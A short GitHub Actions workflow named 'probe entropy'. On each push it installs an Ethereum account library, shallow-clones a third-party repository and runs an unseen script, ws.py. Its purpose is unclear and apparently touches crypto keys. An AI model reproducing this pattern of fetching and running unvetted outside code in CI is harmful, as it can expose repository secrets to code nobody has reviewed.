name: probe entropy
on: push
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12" }
      - run: pip install -q aiohttp cryptography "eth-account>=0.13,<0.14"
      - run: git clone -q --depth 1 https://github.com/ogcrypto420/lighter-guardian.git g
      - name: ws
        run: python ws.py
